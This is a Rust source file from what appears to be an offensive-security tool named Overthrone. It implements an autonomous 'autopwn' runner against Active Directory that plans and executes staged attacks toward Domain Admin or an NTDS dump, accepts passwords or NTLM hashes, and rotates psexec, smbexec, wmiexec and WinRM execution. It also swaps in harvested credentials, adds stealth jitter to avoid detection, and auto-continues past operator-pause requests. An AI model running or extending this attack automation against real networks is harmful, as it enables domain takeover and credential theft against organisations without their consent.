//! Top-level runner — The main autopwn loop that ties together
//! goals, planner, executor, and adaptive engine into a cohesive
//! autonomous attack workflow.
//!
//! Flow:
//!   1. Parse config → set goal
//!   2. Planner builds initial attack plan
//!   3. Loop over plan steps:
//!      a. Executor runs the step
//!      b. Adaptive engine evaluates result
//!      c. Decision: continue / retry / skip / re-plan / abort
//!   4. Check if goal is achieved after each step
//!   5. If blocked, adaptive re-plans with updated state
//!   6. Return final result with full audit trail

use crate::adaptive::{AdaptiveDecision, AdaptiveEngine, AdaptiveSummary, StepModification};
use crate::executor::{self, ExecContext};
use crate::goals::{AttackGoal, EngagementState, GoalStatus};
use crate::planner::{AttackPlan, PlanStep, Planner};
use crate::playbook::{Playbook, PlaybookId};
use chrono::{DateTime, Utc};
use colored::Colorize;
use indicatif::{ProgressBar, ProgressStyle};
use overthrone_core::error::Result;
use serde::{Deserialize, Serialize};
use std::time::Instant;
use tracing::{error, info, warn};

#[cfg(feature = "qlearn")]
use crate::qlearner::{AdaptiveMode, AdaptiveQLearner, EngagementStateKey, decision_to_action};

// ═══════════════════════════════════════════════════════════
// Credentials
// ═══════════════════════════════════════════════════════════

/// Holds domain credentials for the pilot runner.
/// Private `secret` field is intentional — use `CredentialSnapshot` for serde.
#[derive(Debug, Clone)]
pub struct Credentials {
    pub domain: String,
    pub username: String,
    secret: String,
    is_hash: bool,
}

impl Credentials {
    pub fn password(domain: &str, username: &str, password: &str) -> Self {
        Self {
            domain: domain.to_string(),
            username: username.to_string(),
            secret: password.to_string(),
            is_hash: false,
        }
    }

    pub fn ntlm_hash(domain: &str, username: &str, hash: &str) -> Self {
        Self {
            domain: domain.to_string(),
            username: username.to_string(),
            secret: hash.to_string(),
            is_hash: true,
        }
    }

    pub fn secret(&self) -> &str {
        &self.secret
    }

    pub fn is_hash(&self) -> bool {
        self.is_hash
    }

    /// Convert to serializable snapshot (for checkpoint save)
    pub fn to_snapshot(&self) -> CredentialSnapshot {
        CredentialSnapshot {
            domain: self.domain.clone(),
            username: self.username.clone(),
            secret: self.secret.clone(),
            is_hash: self.is_hash,
        }
    }

    /// Restore from snapshot (for checkpoint load)
    pub fn from_snapshot(snap: CredentialSnapshot) -> Self {
        Self {
            domain: snap.domain,
            username: snap.username,
            secret: snap.secret,
            is_hash: snap.is_hash,
        }
    }
}

/// Serializable credential snapshot used in checkpoints.
/// Stores all fields plaintext — only write to disk in a secure context.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CredentialSnapshot {
    pub domain: String,
    pub username: String,
    pub secret: String,
    pub is_hash: bool,
}

// ═══════════════════════════════════════════════════════════
// Stages (ordered attack phases)
// ═══════════════════════════════════════════════════════════

/// Ordered attack stages
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum Stage {
    Enumerate = 0,
    Attack = 1,
    Escalate = 2,
    Lateral = 3,
    Loot = 4,
    Cleanup = 5,
}

impl std::fmt::Display for Stage {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Enumerate => write!(f, "ENUM"),
            Self::Attack => write!(f, "ATTACK"),
            Self::Escalate => write!(f, "ESCALATE"),
            Self::Lateral => write!(f, "LATERAL"),
            Self::Loot => write!(f, "LOOT"),
            Self::Cleanup => write!(f, "CLEANUP"),
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Exec Method
// ═══════════════════════════════════════════════════════════

/// Remote execution method preference
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ExecMethod {
    Auto,
    PsExec,
    SmbExec,
    WmiExec,
    WinRm,
}

impl std::fmt::Display for ExecMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Auto => write!(f, "auto"),
            Self::PsExec => write!(f, "psexec"),
            Self::SmbExec => write!(f, "smbexec"),
            Self::WmiExec => write!(f, "wmiexec"),
            Self::WinRm => write!(f, "winrm"),
        }
    }
}

// ═══════════════════════════════════════════════════════════
// AutoPwn Configuration
// ═══════════════════════════════════════════════════════════

/// Serializable config used by WizardSession checkpointing.
/// Mirrors AutoPwnConfig but uses CredentialSnapshot for serde.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AutoPwnConfigSnapshot {
    pub dc_host: String,
    pub creds: CredentialSnapshot,
    pub target: String,
    pub max_stage: Stage,
    pub stealth: bool,
    pub dry_run: bool,
    pub exec_method: ExecMethod,
    pub jitter_ms: u64,
    pub use_ldaps: bool,
    pub timeout: u64,
}

/// Configuration for the autonomous attack runner
#[derive(Debug, Clone)]
pub struct AutoPwnConfig {
    /// Domain controller IP/hostname
    pub dc_host: String,
    /// Credentials to start with
    pub creds: Credentials,
    /// High-level target (e.g., "Domain Admins")
    pub target: String,
    /// Maximum stage to reach
    pub max_stage: Stage,
    /// Stealth mode — prefer low-noise methods
    pub stealth: bool,
    /// Dry run — plan only, don't execute
    pub dry_run: bool,
    /// Preferred execution method
    pub exec_method: ExecMethod,
    /// Jitter between steps (milliseconds)
    pub jitter_ms: u64,
    /// Use LDAPS
    pub use_ldaps: bool,
    /// Operation timeout per step (seconds)
    pub timeout: u64,
    /// Adaptive engine mode (only used with `qlearn` feature)
    #[cfg(feature = "qlearn")]
    pub adaptive_mode: AdaptiveMode,
    /// Path for Q-table persistence (only used with `qlearn` feature)
    #[cfg(feature = "qlearn")]
    pub q_table_path: std::path::PathBuf,
}

impl AutoPwnConfig {
    /// Derive the attack goal from the target string
    pub fn goal(&self) -> AttackGoal {
        let lower = self.target.to_lowercase();

        if lower == "domain admins" || lower == "da" || lower == "enterprise admins" {
            AttackGoal::DomainAdmin {
                target_group: self.target.clone(),
            }
        } else if lower == "ntds" || lower == "ntds.dit" || lower == "dcsync" {
            AttackGoal::DumpNtds { target_dc: None }
        } else if lower == "recon" || lower == "enum" || lower == "enumerate" {
            AttackGoal::ReconOnly
        } else if lower.contains('.') || lower.contains('$') {
            AttackGoal::CompromiseHost {
                target_host: self.target.clone(),
            }
        } else if lower.contains('\\') || lower.contains('@') {
            AttackGoal::CompromiseUser {
                target_user: self.target.clone(),
            }
        } else {
            AttackGoal::DomainAdmin {
                target_group: self.target.clone(),
            }
        }
    }

    /// Build executor context from this config
    pub fn exec_context(&self) -> ExecContext {
        ExecContext {
            dc_ip: self.dc_host.clone(),
            domain: self.creds.domain.clone(),
            username: self.creds.username.clone(),
            secret: self.creds.secret().to_string(),
            use_hash: self.creds.is_hash(),
            use_ldaps: self.use_ldaps,
            timeout: self.timeout,
            jitter_ms: if self.stealth {
                2000.max(self.jitter_ms)
            } else {
                self.jitter_ms
            },
            dry_run: self.dry_run,
            override_creds: None,
            ldap_available: true,
            preferred_method: format!("{:?}", self.exec_method).to_lowercase(),
        }
    }

    /// Convert to serializable snapshot (for checkpointing)
    pub fn to_snapshot(&self) -> AutoPwnConfigSnapshot {
        AutoPwnConfigSnapshot {
            dc_host: self.dc_host.clone(),
            creds: self.creds.to_snapshot(),
            target: self.target.clone(),
            max_stage: self.max_stage,
            stealth: self.stealth,
            dry_run: self.dry_run,
            exec_method: self.exec_method,
            jitter_ms: self.jitter_ms,
            use_ldaps: self.use_ldaps,
            timeout: self.timeout,
        }
    }

    /// Restore from snapshot (for checkpoint load)
    pub fn from_snapshot(snap: AutoPwnConfigSnapshot) -> Self {
        Self {
            dc_host: snap.dc_host,
            creds: Credentials::from_snapshot(snap.creds),
            target: snap.target,
            max_stage: snap.max_stage,
            stealth: snap.stealth,
            dry_run: snap.dry_run,
            exec_method: snap.exec_method,
            jitter_ms: snap.jitter_ms,
            use_ldaps: snap.use_ldaps,
            timeout: snap.timeout,
            #[cfg(feature = "qlearn")]
            adaptive_mode: AdaptiveMode::default(),
            #[cfg(feature = "qlearn")]
            q_table_path: std::path::PathBuf::from("q_table.json"),
        }
    }
}

// ═══════════════════════════════════════════════════════════
// AutoPwn Result
// ═══════════════════════════════════════════════════════════

/// Final result of the autonomous attack run
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AutoPwnResult {
    pub domain_admin_achieved: bool,
    pub goal_status: GoalStatus,
    pub state: EngagementState,
    pub adaptive_summary: AdaptiveSummary,
    pub duration_secs: u64,
    pub started_at: DateTime<Utc>,
    pub finished_at: DateTime<Utc>,
    pub steps_executed: usize,
    pub steps_succeeded: usize,
    pub steps_failed: usize,
}

// ═══════════════════════════════════════════════════════════
// Main Runner
// ═══════════════════════════════════════════════════════════

/// Run the autonomous attack chain
pub async fn run(config: AutoPwnConfig) -> AutoPwnResult {
    let started_at = Utc::now();
    let wall_start = Instant::now();

    println!(
        "\n{}",
        "╔══════════════════════════════════════════════╗"
            .bold()
            .red()
    );
    println!(
        "{}",
        "║          OVERTHRONE — PILOT AUTOPWN          ║"
            .bold()
            .red()
    );
    println!(
        "{}",
        "╚══════════════════════════════════════════════╝"
            .bold()
            .red()
    );

    let goal = config.goal();
    info!("{} Goal: {}", "TARGET".bold().red(), goal.describe().bold());
    info!(
        "{} DC: {} | Domain: {} | User: {} | Stealth: {} | Dry: {}",
        "CONFIG".bold().blue(),
        config.dc_host.bold(),
        config.creds.domain.bold(),
        config.creds.username.bold(),
        if config.stealth {
            "ON".green()
        } else {
            "OFF".yellow()
        },
        if config.dry_run {
            "YES".yellow()
        } else {
            "NO".dimmed()
        }
    );
    println!();

    let mut state = EngagementState::new();
    state.domain = Some(config.creds.domain.clone());
    state.dc_ip = Some(config.dc_host.clone());

    let planner = Planner::new(config.stealth);
    let mut adaptive = AdaptiveEngine::new(config.stealth);
    let mut ctx = config.exec_context();

    // ── Q-Learning Engine (optional) ──
    #[cfg(feature = "qlearn")]
    let mut qlearner: Option<AdaptiveQLearner> = match config.adaptive_mode {
        AdaptiveMode::QLearning | AdaptiveMode::Hybrid => {
            let ql = AdaptiveQLearner::load(config.stealth, config.q_table_path.clone());
            info!(
                "{} Q-learner loaded (mode={:?}, states={}, ε={:.3})",
                "QL".bold().magenta(),
                config.adaptive_mode,
                ql.q_table_size(),
                ql.epsilon()
            );
            Some(ql)
        }
        AdaptiveMode::Heuristic => None,
    };

    // ── LDAP Pre-flight Check ──
    // Try LDAP bind to verify connectivity before starting the attack chain.
    // If it fails, mark LDAP as unavailable to skip LDAP-dependent steps
    // instead of failing each one identically.
    if !config.dry_run {
        info!(
            "{} Pre-flight LDAP connectivity check...",
            "PRE".bold().cyan()
        );
        let (_, _, use_hash) = (ctx.username.as_str(), ctx.secret.as_str(), ctx.use_hash);
        let password = if use_hash { "" } else { &ctx.secret };
        match overthrone_core::proto::ldap::LdapSession::connect(
            &ctx.dc_ip,
            &ctx.domain,
            &ctx.username,
            password,
            ctx.use_ldaps,
        )
        .await
        {
            Ok(mut session) => {
                info!(
                    "  {} LDAP bind OK ({})",
                    "✓".green().bold(),
                    session.bind_type
                );
                let _ = session.disconnect().await;
            }
            Err(e) => {
                warn!("  {} LDAP pre-flight failed: {}", "✗".red().bold(), e);
                warn!(
                    "  {} LDAP-dependent enumeration steps will be skipped. \
                     Kerberos and SMB operations will still be attempted.",
                    "!".yellow().bold()
                );
                ctx.ldap_available = false;
            }
        }
    }

    let mut steps_executed = 0usize;
    let mut steps_succeeded = 0usize;
    let mut steps_failed = 0usize;

    let mut plan = planner.plan(&goal, &state, adaptive.failed_actions());

    'main: loop {
        adaptive.adjust_plan(&mut plan, &state);

        let step_idx = match plan.steps.iter().position(|s| !s.executed) {
            Some(idx) => idx,
            None => {
                info!("{} All planned steps executed", "✓".green().bold());
                break 'main;
            }
        };

        let step = &plan.steps[step_idx];
        if step.stage > config.max_stage {
            info!(
                "  {} Stage {} exceeds max ({}), stopping",
                "⊘".dimmed(),
                step.stage,
                config.max_stage
            );
            break 'main;
        }

        if step_idx == 0
            || plan.steps.get(step_idx.wrapping_sub(1)).map(|s| s.stage) != Some(step.stage)
        {
            print_stage_banner(step.stage);
        }

        let result = executor::execute_step(step, &ctx, &mut state).await;
        steps_executed += 1;

        plan.steps[step_idx].executed = true;
        plan.steps[step_idx].result = Some(result.clone());

        if result.success {
            steps_succeeded += 1;
        } else {
            steps_failed += 1;
        }

        // ── Encode state for Q-learning (before decision) ──
        #[cfg(feature = "qlearn")]
        let pre_state_key = qlearner.as_ref().map(|_| {
            EngagementStateKey::encode(
                &state,
                &plan.steps[step_idx],
                &result,
                config.stealth,
                adaptive.consecutive_failures(),
            )
        });

        // ── Decide next action ──
        #[cfg(feature = "qlearn")]
        let decision = if let Some(ref mut ql) = qlearner {
            ql.evaluate(&plan.steps[step_idx], &result, &state, &goal)
        } else {
            adaptive.evaluate(&plan.steps[step_idx], &result, &state, &goal)
        };
        #[cfg(not(feature = "qlearn"))]
        let decision = adaptive.evaluate(&plan.steps[step_idx], &result, &state, &goal);

        // ── Record Q-learning outcome ──
        #[cfg(feature = "qlearn")]
        if let (Some(ql), Some(pre_key)) = (&mut qlearner, &pre_state_key) {
            let goal_achieved = state.evaluate_goal(&goal).is_success();
            let reward = AdaptiveQLearner::compute_reward(&result, goal_achieved, &decision);
            let action = decision_to_action(&decision);

            // Post-decision state key (same step, result already applied)
            let post_key = EngagementStateKey::encode(
                &state,
                &plan.steps[step_idx],
                &result,
                config.stealth,
                adaptive.consecutive_failures(),
            );
            ql.record_outcome(pre_key, &action, reward, &post_key);
        }

        match decision {
            AdaptiveDecision::Continue => {
                let status = state.evaluate_goal(&goal);
                if status.is_success() {
                    info!(
                        "\n  {} {} {}",
                        "🎯".bold(),
                        "GOAL ACHIEVED:".green().bold(),
                        goal.describe().bold()
                    );
                    break 'main;
                }
            }

            AdaptiveDecision::Retry { delay_secs, modify } => {
                info!(
                    "  {} Retrying in {}s (modification: {:?})",
                    "🔄".cyan(),
                    delay_secs,
                    modify
                );
                if let Some(modification) = modify {
                    match modification {
                        StepModification::SwapCredentials => {
                            if let Some((u, s, h)) =
                                crate::adaptive::rotate_credential(&state, &ctx.username)
                            {
                                info!("  {} Swapping to: {}", "🔑".cyan(), u.bold());
                                ctx.override_creds = Some((u, s, h));
                            }
                        }
                        StepModification::ExtendTimeout => {
                            ctx.timeout = (ctx.timeout * 2).min(120);
                        }
                        StepModification::ReduceNoise => {
                            ctx.jitter_ms = (ctx.jitter_ms + 1000).min(10_000);
                        }
                        StepModification::AlternateMethod => {
                            // Rotate to next execution method
                            let next = match ctx.preferred_method.as_str() {
                                "smbexec" => "wmiexec",
                                "wmiexec" => "winrmexec",
                                "winrmexec" => "psexec",
                                _ => "smbexec",
                            };
                            info!(
                                "  {} Switching exec method: {} → {}",
                                "🔄".cyan(),
                                ctx.preferred_method.bold(),
                                next.bold()
                            );
                            ctx.preferred_method = next.to_string();
                        }
                    }
                }
                tokio::time::sleep(tokio::time::Duration::from_secs(delay_secs)).await;
                plan.steps[step_idx].executed = false;
                plan.steps[step_idx].retries += 1;
                plan.steps[step_idx].result = None;
            }

            AdaptiveDecision::Skip { reason } => {
                info!("  {} Skipping: {}", "→".dimmed(), reason.dimmed());
            }

            AdaptiveDecision::Substitute { replacement } => {
                info!(
                    "  {} Substituting action for: {}",
                    "🔄".cyan(),
                    plan.steps[step_idx].description
                );
                let new_step = PlanStep {
                    id: format!("{}_alt", plan.steps[step_idx].id),
                    description: format!("{} (alternative)", plan.steps[step_idx].description),
                    stage: plan.steps[step_idx].stage,
                    action: replacement,
                    priority: plan.steps[step_idx].priority - 1,
                    noise: plan.steps[step_idx].noise,
                    depends_on: vec![],
                    executed: false,
                    result: None,
                    retries: 0,
                    max_retries: plan.steps[step_idx].max_retries,
                };
                plan.steps.insert(step_idx + 1, new_step);
            }

            AdaptiveDecision::Replan { reason } => {
                info!("\n  {} RE-PLANNING: {}", "🔄".blue().bold(), reason);
                if adaptive.replans_exhausted() {
                    warn!("  {} Re-plan limit exhausted — aborting", "✗".red().bold());
                    break 'main;
                }
                plan = planner.plan(&goal, &state, adaptive.failed_actions());
            }

            AdaptiveDecision::Abort { reason } => {
                error!("\n  {} ABORTING: {}", "✗".red().bold(), reason);
                break 'main;
            }

            AdaptiveDecision::PauseForOperator { message } => {
                warn!(
                    "\n  {} OPERATOR INPUT NEEDED: {}",
                    "⏸".yellow().bold(),
                    message
                );
                info!("  {} Auto-continuing (non-interactive mode)", "→".dimmed());
            }
        }

        if config.stealth && !config.dry_run {
            let jitter = rand::random::<u64>() % ctx.jitter_ms.max(500);
            tokio::time::sleep(tokio::time::Duration::from_millis(jitter)).await;
        }

        // Auto-save state every 10 steps for recovery
        if steps_executed.is_multiple_of(10) {
            state.auto_save();
        }
    }

    // ── Final Report ──
    let finished_at = Utc::now();
    let duration_secs = wall_start.elapsed().as_secs();

    // ── Q-Learning: end episode & persist ──
    #[cfg(feature = "qlearn")]
    if let Some(ref mut ql) = qlearner {
        ql.end_episode();
        if let Err(e) = ql.save() {
            warn!("Q-learner: Failed to save Q-table: {e}");
        }
    }

    let final_status = state.evaluate_goal(&goal);
    let da_achieved = final_status.is_success()
        || state.has_domain_admin
        || matches!(final_status, GoalStatus::Achieved);

    println!(
        "\n{}",
        "╔══════════════════════════════════════════════╗"
            .bold()
            .cyan()
    );
    println!(
        "{}",
        "║            PILOT — FINAL REPORT              ║"
            .bold()
            .cyan()
    );
    println!(
        "{}",
        "╚══════════════════════════════════════════════╝"
            .bold()
            .cyan()
    );

    state.print_summary();

    println!(
        "  Goal:       {} → {}",
        goal.describe().bold(),
        final_status
    );
    println!(
        "  Steps:      {} executed, {} succeeded, {} failed",
        steps_executed,
        steps_succeeded.to_string().green(),
        if steps_failed > 0 {
            steps_failed.to_string().red()
        } else {
            steps_failed.to_string().green()
        }
    );
    println!("  Duration:   {}s", duration_secs);
    println!(
        "  DA:         {}",
        if da_achieved {
            format!("ACHIEVED ({})", state.da_user.as_deref().unwrap_or("?"))
                .green()
                .bold()
                .to_string()
        } else {
            "NOT ACHIEVED".red().to_string()
        }
    );

    let adaptive_summary = adaptive.summary();
    println!("{}", adaptive_summary);

    if !state.action_log.is_empty() {
        println!("{}", "═══ AUDIT TRAIL ═══".bold().dimmed());
        for entry in &state.action_log {
            let icon = if entry.success {
                "✓".green()
            } else {
                "✗".red()
            };
            println!(
                "  {} [{}] [{}] {} → {}",
                icon,
                entry.timestamp.format("%H:%M:%S"),
                entry.stage,
                entry.action,
                if entry.detail.len() > 80 {
                    format!("{}...", &entry.detail[..77])
                } else {
                    entry.detail.clone()
                }
            );
        }
        println!("{}", "═══════════════════".dimmed());
    }

    AutoPwnResult {
        domain_admin_achieved: da_achieved,
        goal_status: final_status,
        state,
        adaptive_summary,
        duration_secs,
        started_at,
        finished_at,
        steps_executed,
        steps_succeeded,
        steps_failed,
    }
}

// ── Helpers ──

fn print_stage_banner(stage: Stage) {
    let (icon, color_fn): (&str, fn(String) -> colored::ColoredString) = match stage {
        Stage::Enumerate => ("🔍", |s| s.blue()),
        Stage::Attack => ("⚔️ ", |s| s.yellow()),
        Stage::Escalate => ("📈", |s| s.red()),
        Stage::Lateral => ("🔀", |s| s.magenta()),
        Stage::Loot => ("💰", |s| s.red()),
        Stage::Cleanup => ("🧹", |s| s.green()),
    };
    let banner = format!("══════ {} STAGE: {} ══════", icon, stage);
    println!("\n{}", color_fn(banner).bold());
}

/// Execute a named playbook directly (bypasses goal-driven planning)
pub async fn run_playbook(playbook_id: PlaybookId, config: &AutoPwnConfig) -> AutoPwnResult {
    let started_at = Utc::now();
    let wall_start = Instant::now();

    let playbook = Playbook::generate(playbook_id);
    info!(
        "{} Running playbook: {} ({})",
        "PLAY".bold().magenta(),
        playbook.name.bold(),
        playbook.description
    );

    let mut state = EngagementState::new();
    state.domain = Some(config.creds.domain.clone());
    state.dc_ip = Some(config.dc_host.clone());

    let ctx = config.exec_context();
    let mut steps_executed = 0;
    let mut steps_succeeded = 0;
    let mut steps_failed = 0;

    let pb = ProgressBar::new(playbook.steps.len() as u64);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("  {spinner:.cyan} [{bar:30.cyan/dim}] {pos}/{len} {msg}")
            .unwrap()
            .progress_chars("█▓░"),
    );

    for step in &playbook.steps {
        pb.set_message(step.description.clone());
        let result = executor::execute_step(step, &ctx, &mut state).await;
        steps_executed += 1;
        if result.success {
            steps_succeeded += 1;
        } else {
            steps_failed += 1;
        }
        pb.inc(1);
    }

    pb.finish_with_message("Done".to_string());

    let finished_at = Utc::now();
    state.print_summary();

    AutoPwnResult {
        domain_admin_achieved: state.has_domain_admin,
        goal_status: GoalStatus::InProgress,
        state,
        adaptive_summary: AdaptiveSummary {
            total_replans: 0,
            dead_hosts: vec![],
            blocked_methods: vec![],
            blacklisted_actions: vec![],
        },
        duration_secs: wall_start.elapsed().as_secs(),
        started_at,
        finished_at,
        steps_executed,
        steps_succeeded,
        steps_failed,
    }
}
